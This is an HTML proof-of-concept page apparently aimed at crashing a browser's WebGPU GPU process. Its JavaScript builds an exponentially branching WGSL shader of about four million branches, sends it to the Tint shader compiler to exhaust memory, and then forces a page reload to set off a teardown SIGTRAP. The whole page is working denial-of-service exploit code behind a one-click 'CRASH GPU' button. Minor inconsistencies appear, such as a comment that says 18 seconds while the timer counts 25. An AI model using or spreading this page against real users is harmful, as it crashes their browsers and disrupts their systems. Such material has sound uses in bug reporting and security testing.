<!DOCTYPE html>
<html>
<head>
    <title>WebGPU Tint AST Exhaustion PoC</title>
    <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
</head>
<body>
    <h2>Tint AST Memory Exhaustion (SIGTRAP)25</h2>
    <p>Clicking the button builds a 4-million branch WGSL shader to OOM the GPU process.</p>
    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
    <div id="status" style="margin-top: 20px; white-space: pre-wrap;">Waiting...</div>

    <script>
        const statusEl = document.getElementById('status');

        // Exponentially branching AST generator
        function generateMassiveAST(depth) {
            if (depth <= 0) return `return vec4<f32>(1.0);`;
            const branch = generateMassiveAST(depth - 1);
            return `if (true) { ${branch} } else { ${branch} }`;
        }

        async function triggerCrash() {
            if (!navigator.gpu) {
                statusEl.innerText = "WebGPU is not supported.";
                return;
            }

            const adapter = await navigator.gpu.requestAdapter();
            const device = await adapter.requestDevice();

            statusEl.innerText = "1. Building massive WGSL string in JavaScript (Please wait)...";
            
            // Depth 22 = ~4.1 million branches. 
            // Avoids JS RangeError, but guarantees C++ Tint AST OOM.
            setTimeout(() => {
                try {
                    const body = generateMassiveAST(22);
                    const killerWGSL = `@vertex fn vs_main() -> @builtin(position) vec4<f32> {\n${body}\n}`;
                    
                    statusEl.innerText = "2. String built! Sending to Tint Compiler...\n";
                    
                    // Send it to the GPU Process
                    device.createShaderModule({ code: killerWGSL });
                    
                    // 3. The 18-Second Memory Pressure Countdown
                    let timeLeft = 25;
                    statusEl.innerText += `3. GPU memory filling up. Auto-refreshing in ${timeLeft}s to trigger teardown SIGTRAP...`;
                    
                    const timer = setInterval(() => {
                        timeLeft--;
                        if (timeLeft > 0) {
                            statusEl.innerText = `2. String built! Sending to Tint Compiler...\n3. GPU memory filling up. Auto-refreshing in ${timeLeft}s to trigger teardown SIGTRAP...`;
                        } else {
                            clearInterval(timer);
                            statusEl.innerText = "4. TRIGGERING TEARDOWN NOW!";
                            // The refresh cuts the IPC pipe while the GPU is at max memory, triggering the crash
                            window.location.reload();
                        }
                    }, 1000);

                } catch (e) {
                    statusEl.innerText = "JS Error (Try lowering depth to 21 if RangeError occurs): " + e.message;
                }
            }, 100); 
        }

        document.getElementById('crashBtn').addEventListener('click', triggerCrash);
    </script>
</body>
</html>
